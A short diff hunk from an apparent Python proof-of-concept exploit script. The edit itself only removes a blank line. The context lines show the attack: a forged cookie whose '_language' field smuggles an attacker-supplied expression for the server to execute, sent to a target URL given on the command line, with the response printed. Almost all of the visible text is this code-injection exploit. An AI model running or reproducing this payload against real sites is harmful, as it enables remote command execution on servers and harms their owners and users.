@@ -15,7 +15,6 @@ def poc(url,eexec):
 	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
 	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=10).text.encode('gbk', 'ignore').decode('gbk')[0:80]
 	print res
-
 	
 if __name__ == '__main__':
 	if len(sys.argv) <=2:
